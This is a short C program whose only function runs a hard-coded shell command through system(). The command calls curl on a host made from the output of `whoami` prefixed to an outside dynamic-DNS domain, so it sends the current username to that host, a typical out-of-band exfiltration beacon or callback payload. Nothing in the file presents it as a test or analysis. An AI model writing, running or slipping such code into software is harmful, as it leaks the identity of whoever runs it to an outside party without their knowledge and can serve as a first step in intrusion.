#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    const char *cmd = "curl `whoami`.e6ed7e9910.ddns.bypass.eu.org";

    int rc = system(cmd);
    if (rc == -1) {
        fprintf(stderr, "failed to execute shell command: %s\n", strerror(errno));
        return 127;
    }

    return rc;
}
